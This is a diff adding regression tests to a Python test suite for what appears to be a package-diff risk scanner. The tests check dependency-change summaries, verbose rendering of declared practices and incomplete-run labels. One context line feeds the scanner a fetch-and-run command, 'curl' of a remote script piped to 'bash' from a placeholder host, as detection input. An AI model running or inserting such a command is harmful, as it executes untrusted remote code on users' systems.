@@ -632,3 +632,95 @@ def test_read_only_config_accessors_are_not_mutated():
         # A full analysis must leave every shared table exactly as it was.
         scan_diff(HEADER + "+curl https://x.invalid/s.sh | bash\n", package_name="p")
         assert repr(accessor()) == snapshot, f"{accessor.__name__} was mutated"
+
+
+# --- defects found by audit, pinned so they cannot return -----------------
+
+
+def test_dependency_changes_reach_the_change_summary():
+    """B7's dependency row was dead twice over.
+
+    `fact.dependency_changes` was never populated, and `summarise` read a
+    `{op: names}` shape that `extract_dependency_changes` does not return
+    (it returns `{field: {added names}}`). Adding a dependency produced no
+    change entry at all.
+    """
+    diff = HEADER + "+depends=('qt6-svg' 'glibc')\n"
+    fact = scan_diff(diff, package_name="demo")
+    assert fact.dependency_changes, "dependency_changes was not populated"
+    assert any(c.startswith("depends: ") for c in fact.changes), fact.changes
+    entry = next(c for c in fact.changes if c.startswith("depends: "))
+    assert "+qt6-svg" in entry and "+glibc" in entry
+
+
+def test_declared_default_is_actually_used():
+    """B10 promised a default subset with the rest under --verbose.
+
+    `DECLARED_DEFAULT` existed and was referenced by nothing, so every
+    declared practice rendered every time and the documented behaviour did
+    not exist.
+    """
+    import inspect as _inspect
+
+    import trustsight.cli.inspect as inspect_cli
+    from trustsight.scoring import DECLARED_DEFAULT
+
+    assert DECLARED_DEFAULT
+    source = _inspect.getsource(inspect_cli)
+    assert "DECLARED_DEFAULT" in source, "the default subset is never applied"
+
+
+def test_the_declared_group_honours_verbose():
+    from rich.console import Console
+
+    import trustsight.cli.display as display
+    import trustsight.cli.inspect as inspect_cli
+
+    diff = HEADER + (
+        '+source=("https://github.com/d/d/archive/v1.tar.gz")\n'
+        "+sha256sums=('3b1f8a2c9d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8')\n"
+    )
+    fact = scan_diff(diff, package_name="demo")
+
+    def render(verbose):
+        buffer = io.StringIO()
+        saved = display._console
+        display._console = Console(file=buffer, force_terminal=False, width=110)
+        try:
+            inspect_cli._inspect_rich(fact, verbose=verbose)
+        finally:
+            display._console = saved
+        return buffer.getvalue()
+
+    terse, full = render(False), render(True)
+    assert "more declared practice(s)" in terse
+    assert "more declared practice(s)" not in full
+    # The suppressed ones really are absent, not merely uncounted.
+    assert "checksums declared" not in terse
+    assert "checksums declared" in full
+
+
+def test_stored_rows_do_not_show_a_bare_band_for_an_incomplete_run():
+    """B2 on the history and list surfaces.
+
+    Both re-derived the band from the saved score with `risk_level`, which
+    cannot express Inconclusive and knows nothing about coverage, so a run
+    reported incomplete by `review` displayed a bare band afterwards.
+    """
+    import json
+
+    from trustsight.coverage import DIFF_TRUNCATED, INCOMPLETE_SUFFIX
+    from trustsight.scoring import stored_band
+
+    row = {"final_score": 40, "fact_json": json.dumps(
+        {"risk": "High", "coverage_gaps": [DIFF_TRUNCATED]})}
+    label, complete = stored_band(row)
+    assert label == "High" + INCOMPLETE_SUFFIX
+    assert complete is False
+
+    clean_row = {"final_score": 10, "fact_json": json.dumps(
+        {"risk": "Low", "coverage_gaps": []})}
+    assert stored_band(clean_row) == ("Low", True)
+
+    # A row written before the field existed falls back honestly.
+    assert stored_band({"final_score": 60})[0] == "High"
